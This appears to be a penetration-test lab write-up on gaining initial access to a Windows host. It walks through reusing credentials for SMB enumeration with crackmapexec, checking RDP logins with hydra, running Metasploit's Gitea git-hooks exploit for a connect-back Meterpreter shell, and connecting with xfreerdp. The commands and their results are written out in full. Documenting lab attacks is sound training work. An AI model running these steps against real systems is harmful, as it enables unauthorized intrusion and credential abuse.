# 14 - Windows Initial Access



### Summary of Attack Vectors (Our "Low-Hanging Fruits")
1.  **Credential Reuse:** The credentials `john:SuperSecurePass123` were found on the Linux host. We can test if these are reused on the Windows machine.
2.  **Outdated Gitea Service:** The Gitea instance is running version `1.12.4`, which is outdated and likely has public exploits.
3.  **SMB Misconfigurations:** `SMBv1` is enabled, and the `Guest` account has access to list shares, including a custom share named `Devs`.

---

## 1. Exploitation via SMB (Credential Reuse & Enumeration)

We can leverage the credentials found on the Linux host to perform a deeper enumeration of the SMB service using `crackmapexec`.

### Step 1: Validate Credentials and Enumerate the `Devs` Share
We test the `john` credentials and use the `--spider` module to recursively list the contents of the `Devs` share.

*   **Command:**
    ```shell
    crackmapexec smb 10.129.12.20 -u "john" -p 'SuperSecurePass123' --spider Devs
    ```
*   **Result:**
    *   The login is **successful** (`[+] WIN01\\john:SuperSecurePass123`), confirming password reuse.
    *   The spidering reveals a file named `tmp.ps1`.

### Step 2: Download and Analyze the Discovered File
We download the `tmp.ps1` file for offline analysis.

*   **Command:**
    ```shell
    crackmapexec smb 10.129.12.20 -u "john" -p 'SuperSecurePass123' --share Devs --get-file tmp.ps1 tmp.ps1
    ```
*   **Analysis of `tmp.ps1`:**
    *   The PowerShell script is designed to copy files from a remote share.
    *   **Critical Finding:** It contains the **hardcoded credentials** `john:SuperSecurePass123`. This is a significant security flaw and re-confirms the validity of the credentials for the `john` account on this host.

### Step 3: Verify Credentials for RDP
With confirmed valid credentials, we can check if they work for RDP access.
*   **Tool:** `hydra` can be used to test a single credential pair against the RDP service.
    ```shell
    hydra -l john -p "SuperSecurePass123" rdp://10.129.12.20
    ```
*   **Result:** **Success.** Hydra confirms the credentials are valid for RDP login.

---

## 2. Exploitation via Gitea Vulnerability (Metasploit)

Our research indicated that Gitea v1.12.4 is vulnerable. We can use the Metasploit Framework to exploit this.

### Step 1: Find and Configure the Exploit Module
*   **Search for the exploit:**
    ```
    msf6 > search gitea
    ```
    This reveals `exploit/multi/http/gitea_git_hooks_rce`.

*   **Configure the exploit:** We select the module and set the necessary options.
    ```
    msf6 > use exploit/multi/http/gitea_git_hooks_rce
    msf6 > set RHOSTS 10.129.12.20
    msf6 > set LHOST <your_tun0_ip>
    msf6 > set USERNAME john
    msf6 > set PASSWORD SuperSecurePass123
    msf6 > set target 3 # Select the "Windows Dropper" target
    ```

### Step 2: Execute the Exploit
*   **Command:**
    ```
    msf6 > run
    ```
*   **Execution Flow:**
    1.  The exploit authenticates to the Gitea web interface using the provided credentials.
    2.  It creates a new, temporary Git repository.
    3.  It leverages the vulnerability to write a malicious `git hook` containing our payload into the repository.
    4.  It makes a dummy commit to the repository, which triggers the malicious hook.
    5.  The payload executes on the server and connects back to our Metasploit listener.
*   **Result:** **Success.** We receive a **Meterpreter session**, giving us remote code execution on the target.

---

## 3. Establishing a Stable Connection (RDP)

While a Meterpreter shell is powerful, a full graphical RDP session is often more stable and user-friendly for post-exploitation. Using the credentials we verified earlier, we can connect with `xfreerdp`.

*   **Command:**
    ```shell
    xfreerdp /u:john /p:"SuperSecurePass123" /v:10.129.12.20
    ```
*   **Result:** **Success.** We gain a full, interactive desktop session on the Windows server as the user `john`.

## Summary of Initial Access

We have successfully gained initial access to the Windows target through multiple vectors.

*   **Credential Reuse:** The password for the user `john` was reused from the Linux host, granting access to SMB and RDP.
*   **Hardcoded Credentials:** The `tmp.ps1` script on an SMB share contained hardcoded credentials, re-confirming the password.
*   **Vulnerable Application:** An outdated version of Gitea was successfully exploited using Metasploit to achieve remote code execution.
*   **Stable Access:** A full graphical RDP session was established, providing a stable foothold for the next phase of the test.
